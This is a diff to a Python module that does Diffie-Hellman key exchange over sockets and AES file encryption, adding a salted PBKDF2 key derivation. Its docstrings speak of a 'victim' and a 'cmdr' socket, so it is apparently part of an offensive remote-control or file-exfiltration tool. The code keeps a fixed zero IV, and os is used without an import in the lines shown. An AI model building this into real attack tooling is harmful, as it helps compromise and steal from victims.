@@ -1,9 +1,10 @@
 import socket
-from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.primitives.asymmetric import dh
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.asymmetric.dh import DHPublicKey, DHPrivateKey, DHParameters
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
 
 def send_dh_parameters(cmdr_socket: socket.socket, parameters: DHParameters):
@@ -185,7 +186,7 @@ def key_exchange_receiver(client_sock: socket.socket, serialized_pub_key: bytes)
 def generate_shared_secret(private_key: DHPrivateKey, client_public_key: DHPublicKey):
     """
     Given peer's DHPublicKey, carry out the key exchange and
-    return shared key as bytes.
+    return a derived shared AES key as bytes.
 
     @param private_key:
         The victim's private key
@@ -209,16 +210,66 @@ def generate_shared_secret(private_key: DHPrivateKey, client_public_key: DHPubli
         print("[+] DF SECRET GENERATION UNSUCCESSFUL: An error occurred during secret generation: {}".format(e))
 
 
-def encrypt(file_path: str, shared_key: bytes):
+def generate_salt():
+    """
+    Generates a salt used for the derivation of a
+    shared AES key
+
+    @return salt:
+        A random 16-byte (128 bit) salt
+    """
+    try:
+        print("[+] GENERATING SALT: Now generating a 16-byte (128) bit salt for AES key generation...")
+        salt = os.urandom(16)
+        print("[+] OPERATION SUCCESSFUL: A salt has been generated!")
+        return salt
+    except Exception as e:
+        print("[+] SALT GENERATION FAILED: An error has occurred: {}".format(e))
+
+
+def derive_aes_key(shared_key: bytes, salt: bytes):
+    """
+    Generate a recoverable AES key using the shared Diffie-Hellman
+    secret and a salt.
+
+    @param shared_key:
+        A byte representation of the shared key
+        (after DH key exchange)
+
+    @param salt:
+        A random 16-byte (128 bit) salt
+
+    @return aes_key:
+        A 256-bit AES key used for encryption/decryption
+    """
+    try:
+        print("[+] AES KEY GENERATION: Now generating an AES key using shared secret and salt...")
+
+        kdf = PBKDF2HMAC(
+            algorithm=hashes.SHA256(),
+            length=32,  # => Use 32 bytes for a 256-bit key
+            salt=salt,
+            iterations=100000,
+            backend=default_backend()
+        )
+
+        aes_key = kdf.derive(shared_key)
+        print("[+] OPERATION SUCCESSFUL: An AES key has been generated!")
+        return aes_key
+    except Exception as e:
+        print("[+] AES KEY GENERATION FAILED: An error has occurred: {}".format(e))
+
+
+def encrypt_file(file_path: str, shared_key: bytes):
     """
     Encrypts a file's data using AES (Advanced Encryption Standard)
-    method
+    method.
 
     @param file_path:
         A string representing the path of the file
 
     @param shared_key:
-        A byte representation of the shared key
+        A byte representation of the shared key (secret)
         (after DH key exchange)
 
     @return encrypted_data:
@@ -229,12 +280,22 @@ def encrypt(file_path: str, shared_key: bytes):
         with open(file_path, 'rb') as file:
             file_content = file.read()
 
-        cipher = Cipher(algorithms.AES(shared_key), modes.CFB(b'\0' * 16), backend=default_backend())
+        # Generate a unique salt
+        salt = generate_salt()
+
+        # Derive an AES key using the shared key and salt
+        aes_key = derive_aes_key(shared_key, salt)
+
+        # Perform Encryption using an AES cipher
+        cipher = Cipher(algorithms.AES(aes_key), modes.CFB(b'\0' * 16), backend=default_backend())
         encryptor = cipher.encryptor()
         encrypted_data = encryptor.update(file_content) + encryptor.finalize()
 
+        # Prepend the salt to the encrypted data
+        encrypted_data_with_salt = salt + encrypted_data
+
         print("[+] OPERATION SUCCESSFUL: The data has been successfully encrypted!")
-        return encrypted_data
+        return encrypted_data_with_salt
 
     except Exception as e:
         print("[+] FILE ENCRYPTION ERROR: An error has occurred while encrypting "
@@ -259,7 +320,14 @@ def decrypt(encrypted_data: bytes, shared_key: bytes):
     try:
         print("[+] DECRYPTING: Now decrypting data...")
 
-        cipher = Cipher(algorithms.AES(shared_key), modes.CFB(b'\0' * 16), backend=default_backend())
+        # Extract the 16-byte salt from the encrypted data
+        salt = encrypted_data[:16]  # => Used 16-bytes
+        encrypted_data = encrypted_data[16:]
+
+        # Derive and generate the same AES key used for encryption
+        aes_key = derive_aes_key(shared_key, salt)
+
+        cipher = Cipher(algorithms.AES(aes_key), modes.CFB(b'\0' * 16), backend=default_backend())
         decryptor = cipher.decryptor()
         decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
 
